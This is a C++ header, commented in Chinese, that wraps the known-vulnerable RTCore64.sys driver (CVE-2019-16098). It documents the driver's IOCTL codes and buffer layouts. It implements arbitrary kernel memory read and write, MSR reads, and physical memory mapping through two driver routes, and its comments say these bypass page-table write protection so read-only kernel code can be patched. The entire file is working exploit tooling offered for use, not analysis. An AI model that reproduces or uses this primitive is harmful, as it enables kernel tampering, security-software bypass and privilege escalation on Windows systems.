#pragma once
// RTCore64.sys (CVE-2019-16098) 驱动封装。
//
// 该驱动（third_party/RTCore64.sys）实际提供的能力（已按分发表逐个核对）：
//   0x80002030  rdmsr        输入 MSRRead{reg, high, low}
//   0x80002034  wrmsr        输入 MSRRead{reg, high, low}
//   0x80002040  map          MapIO{pa, mapped(out), size}   -> MmMapIoSpace，最大 0xC0000 且 pa >= 0xC0000
//   0x80002044  unmap        MapIO{mapped, size}             -> MmUnmapIoSpace
//   0x80002048  read         MemIO{address, offset, size, value(out)}   size=1/2/4
//   0x8000204C  write        MemIO{address, offset, size, value}
//
// 注意：read/write 是在内核上下文里直接解引用 DWORD*，所以只能写“可写”的内核页；
// 对只读的 .rdata / .text 必须走 map + 物理写（见 core.cpp 的说明）。

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <stdexcept>
#include <string>
#include <algorithm>
#include <Windows.h>

namespace rtcore {

constexpr const wchar_t* DEVICE_PATH     = L"\\\\.\\RTCore64";
constexpr const char*    SERVICE_NAME    = "RTCore64";
constexpr const char*    DRIVER_FILENAME = "RTCore64.sys";

constexpr uint32_t IOCTL_MSR_READ    = 0x80002030;
constexpr uint32_t IOCTL_MSR_WRITE   = 0x80002034;
constexpr uint32_t IOCTL_PHYS_MAP    = 0x80002040;  // HalTranslateBusAddress + MmMapIoSpace
constexpr uint32_t IOCTL_PHYS_UNMAP  = 0x80002044;
constexpr uint32_t IOCTL_SEC_MAP     = 0x80002000;  // \Device\PhysicalMemory + ZwMapViewOfSection
constexpr uint32_t IOCTL_SEC_UNMAP   = 0x80002004;
constexpr uint32_t IOCTL_MEM_READ    = 0x80002048;
constexpr uint32_t IOCTL_MEM_WRITE   = 0x8000204C;

// 驱动的参数校验：物理地址不得低于 0xC0000，单次映射不得超过 0xC0000 字节
constexpr uint64_t PHYS_MIN_ADDR = 0xC0000ULL;
constexpr uint32_t PHYS_MAX_SIZE = 0xC0000;

#pragma pack(push, 1)
struct MSRRead {
    uint32_t reg;
    uint32_t value_high;
    uint32_t value_low;
};
static_assert(sizeof(MSRRead) == 12, "MSRRead must be 12 bytes");

// 0x80002048 / 0x8000204C 的输入输出结构（共 0x30 字节，驱动要求 InputBufferLength == 0x30）
struct MemIO {
    uint8_t  pad0[8];    // +0x00
    uint64_t address;    // +0x08 内核虚拟地址
    uint8_t  pad1[8];    // +0x10（+0x14 处是 32 位偏移，保持 0）
    uint32_t size;       // +0x18 1 / 2 / 4
    uint32_t value;      // +0x1C 数据
    uint8_t  pad2[16];   // +0x20
};
static_assert(sizeof(MemIO) == 48, "MemIO must be 48 bytes");

// 0x80002040 / 0x80002044 的输入输出结构（共 0x30 字节）
struct MapIO {
    uint64_t address;    // +0x00 物理地址
    uint64_t mapped;     // +0x08 输出：映射后的虚拟地址
    uint32_t size;       // +0x10 字节数（页对齐）
    uint32_t pad0;       // +0x14
    uint8_t  pad1[0x18]; // +0x18
};
static_assert(sizeof(MapIO) == 48, "MapIO must be 48 bytes");

// 0x80002000 / 0x80002004 的输入输出结构（驱动要求输入 >= 0x20、输出 >= 8，这里给足 0x30）
// 输入：物理地址@0、字节数@8；输出：映射后的虚拟地址写回 @0
struct MapSectionIO {
    uint64_t address;    // +0x00 in: 物理地址 out: 映射后的虚拟地址
    uint32_t size;       // +0x08 in: 字节数
    uint32_t flags;      // +0x0C in: 0（仅在走总线配置回退分支时使用）
    uint8_t  pad[0x20];  // +0x10
};
static_assert(sizeof(MapSectionIO) == 48, "MapSectionIO must be 48 bytes");
#pragma pack(pop)

inline bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

class RTCore {
    HANDLE dev_ = INVALID_HANDLE_VALUE;
    int    mapMethod_ = 0;   // 0=未探测 1=MmMapIoSpace 2=\Device\PhysicalMemory
    uint64_t viewBaseB_ = 0; // B 方式最近一次映射的视图基址（注销视角时必须用它）
    uint32_t viewSizeB_ = 0;

public:
    RTCore() = default;
    ~RTCore() { close(); }
    RTCore(const RTCore&) = delete;
    RTCore& operator=(const RTCore&) = delete;

    void open() {
        dev_ = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (dev_ == INVALID_HANDLE_VALUE)
            throw std::runtime_error("open RTCore64 failed, GLE=" + std::to_string(GetLastError()));
    }

    void close() {
        if (dev_ != INVALID_HANDLE_VALUE) {
            CloseHandle(dev_);
            dev_ = INVALID_HANDLE_VALUE;
        }
    }

    bool is_open() const { return dev_ != INVALID_HANDLE_VALUE; }

    // ---- MSR ----
    uint64_t read_msr(uint32_t idx) const {
        MSRRead io{};
        io.reg = idx;
        DWORD ret = 0;
        if (!DeviceIoControl(dev_, IOCTL_MSR_READ, &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("read_msr failed");
        return (uint64_t(io.value_high) << 32) | io.value_low;
    }

    // ---- 内核虚拟地址读写（1/2/4 字节） ----
    uint32_t read_u32(uint64_t va) const {
        MemIO io{};
        io.address = va;
        io.size    = 4;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_MEM_READ, &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("read_u32 @ 0x" + hex(va) + " GLE=" + std::to_string(GetLastError()));
        return io.value;
    }

    uint64_t read_u64(uint64_t va) const {
        uint32_t lo = read_u32(va);
        uint32_t hi = read_u32(va + 4);
        return (uint64_t(hi) << 32) | lo;
    }

    void write_u32(uint64_t va, uint32_t val) {
        MemIO io{};
        io.address = va;
        io.size    = 4;
        io.value   = val;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_MEM_WRITE, &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("write_u32 @ 0x" + hex(va) + " GLE=" + std::to_string(GetLastError()));
    }

    void write_u64(uint64_t va, uint64_t val) {
        write_u32(va,     uint32_t(val & 0xFFFFFFFF));
        write_u32(va + 4, uint32_t(val >> 32));
    }

    // ---- 批量虚拟地址读写 ----
    void read_va(uint64_t va, void* buf, size_t len) const {
        auto dst = static_cast<uint8_t*>(buf);
        size_t pos = 0;
        while (pos < len) {
            size_t chunk = (std::min)(len - pos, size_t(4));
            uint32_t v   = read_u32(va + pos);
            memcpy(dst + pos, &v, chunk);
            pos += chunk;
        }
    }

    void write_va(uint64_t va, const void* buf, size_t len) {
        auto src = static_cast<const uint8_t*>(buf);
        size_t pos = 0;
        while (pos < len) {
            size_t chunk = (std::min)(len - pos, size_t(4));
            uint32_t v = 0;
            memcpy(&v, src + pos, chunk);
            write_u32(va + pos, v);
            pos += chunk;
        }
    }

    // ---- 物理内存映射（绕过页表写保护） ----
    // 这个驱动有两套映射原语，能否用取决于系统（HAL 与 MmMapIoSpace 的行为）：
    //   A) 0x80002040 HalTranslateBusAddress + MmMapIoSpace
    //   B) 0x80002000 \Device\PhysicalMemory + ZwMapViewOfSection
    // map_phys() 首次调用时按 A -> B 顺序探测，记住可用的一种。
    uint64_t map_phys_A(uint64_t pa, uint32_t size) {
        MapIO io{};
        io.address = pa;
        io.size    = size;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_PHYS_MAP, &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("A(0x80002040) @0x" + hex(pa) + " GLE=" + std::to_string(GetLastError()));
        if (!io.mapped)
            throw std::runtime_error("A(0x80002040) 返回空指针 @0x" + hex(pa));
        return io.mapped;
    }

    // B 走 \Device\PhysicalMemory：视图的偏移和长度都要按 64KB 对齐，
    // 所以内部总是映射一个覆盖目标页的 64KB 窗口，再把窗口内偏移加回去。
    uint64_t map_phys_B(uint64_t pa, uint32_t size) {
        uint64_t base = pa & ~uint64_t(0xFFFF);
        uint64_t need = (pa - base) + size;
        uint32_t win  = uint32_t((need + 0xFFFF) & ~uint64_t(0xFFFF));
        if (win == 0) win = 0x10000;
        if (win > PHYS_MAX_SIZE)
            throw std::runtime_error("B(0x80002000) 窗口过大 0x" + hex(win));

        MapSectionIO io{};
        io.address = base;
        io.size    = win;
        DWORD ret  = 0;
        if (!DeviceIoControl(dev_, IOCTL_SEC_MAP, &io, sizeof(io), &io, sizeof(io), &ret, nullptr))
            throw std::runtime_error("B(0x80002000) pa=0x" + hex(pa) + " win=0x" + hex(win) +
                " GLE=" + std::to_string(GetLastError()));
        if (!io.address)
            throw std::runtime_error("B(0x80002000) 返回空指针 pa=0x" + hex(pa));
        viewBaseB_ = io.address;
        viewSizeB_ = win;
        return io.address + (pa - base);
    }

    uint64_t map_phys(uint64_t pa, uint32_t size) {
        if (size == 0 || size > PHYS_MAX_SIZE)
            throw std::runtime_error("map_phys: 映射长度非法 " + std::to_string(size));
        if (pa < PHYS_MIN_ADDR)
            throw std::runtime_error("map_phys: 物理地址过低 0x" + hex(pa));
        if (pa & 0xFFF)
            throw std::runtime_error("map_phys: 物理地址未页对齐 0x" + hex(pa));

        // 首次调用：A -> B 探测；之后用记住的一种，若它失败再回退到另一种
        auto tryA = [&]() -> uint64_t { return map_phys_A(pa, size); };
        auto tryB = [&]() -> uint64_t { return map_phys_B(pa, size); };

        if (mapMethod_ == 1) {
            try { return tryA(); } catch (const std::exception& e1) {
                try { uint64_t va = tryB(); mapMethod_ = 2; return va; }
                catch (const std::exception& e2) {
                    throw std::runtime_error(std::string(e1.what()) + " | " + e2.what());
                }
            }
        }
        if (mapMethod_ == 2) {
            try { return tryB(); } catch (const std::exception& e1) {
                try { uint64_t va = tryA(); mapMethod_ = 1; return va; }
                catch (const std::exception& e2) {
                    throw std::runtime_error(std::string(e1.what()) + " | " + e2.what());
                }
            }
        }

        std::string errA, errB;
        try { uint64_t va = tryA(); mapMethod_ = 1; return va; }
        catch (const std::exception& e) { errA = e.what(); }
        try { uint64_t va = tryB(); mapMethod_ = 2; return va; }
        catch (const std::exception& e) { errB = e.what(); }

        throw std::runtime_error("两种物理映射原语都失败: " + errA + " | " + errB);
    }

    void unmap_phys(uint64_t va, uint32_t size) {
        if (mapMethod_ == 2) {
            // B: 0x80002004 -> ZwUnmapViewOfSection(NtCurrentProcess, viewBase)
            uint64_t base = viewBaseB_ ? viewBaseB_ : va;
            uint8_t buf[48] = { 0 };
            memcpy(buf, &base, sizeof(base));
            DWORD ret = 0;
            DeviceIoControl(dev_, IOCTL_SEC_UNMAP, buf, sizeof(buf), buf, sizeof(buf), &ret, nullptr);
            viewBaseB_ = 0;
            viewSizeB_ = 0;
            return;
        }
        MapIO io{};
        io.mapped = va;
        io.size   = size;
        DWORD ret = 0;
        DeviceIoControl(dev_, IOCTL_PHYS_UNMAP, &io, sizeof(io), &io, sizeof(io), &ret, nullptr);
    }

    // 1 = MmMapIoSpace, 2 = \Device\PhysicalMemory
    int map_method() const { return mapMethod_; }

    // ---- 物理内存读写（内部按页 map/unmap） ----
    void read_phys(uint64_t pa, void* buf, size_t len) {
        auto dst = static_cast<uint8_t*>(buf);
        size_t done = 0;
        while (done < len) {
            uint64_t cur  = pa + done;
            uint64_t page = cur & ~uint64_t(0xFFF);
            uint32_t off  = uint32_t(cur & 0xFFF);
            size_t chunk  = (std::min)(len - done, size_t(0x1000 - off));
            uint64_t map  = map_phys(page, 0x1000);
            try {
                read_va(map + off, dst + done, chunk);
            } catch (...) {
                unmap_phys(map, 0x1000);
                throw;
            }
            unmap_phys(map, 0x1000);
            done += chunk;
        }
    }

    void write_phys(uint64_t pa, const void* data, size_t len) {
        auto src = static_cast<const uint8_t*>(data);
        uint64_t page = pa & ~uint64_t(0xFFF);
        uint32_t off  = uint32_t(pa & 0xFFF);

        uint32_t mapSize = 0x1000;
        while (uint64_t(off) + len > mapSize && mapSize < PHYS_MAX_SIZE)
            mapSize += 0x1000;
        if (uint64_t(off) + len > mapSize)
            throw std::runtime_error("write_phys: 写入跨页过多");

        uint64_t map = map_phys(page, mapSize);
        try {
            size_t i = 0;
            for (; i + 4 <= len; i += 4) {
                uint32_t v;
                memcpy(&v, src + i, 4);
                write_u32(map + off + i, v);
            }
            if (i < len) {                       // 尾部不足 4 字节：读-改-写
                uint32_t v = read_u32(map + off + i);
                memcpy(&v, src + i, len - i);
                write_u32(map + off + i, v);
            }
        } catch (...) {
            unmap_phys(map, mapSize);
            throw;
        }
        unmap_phys(map, mapSize);
    }

    static std::string hex(uint64_t v) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%llX", (unsigned long long)v);
        return buf;
    }
};

} // namespace rtcore
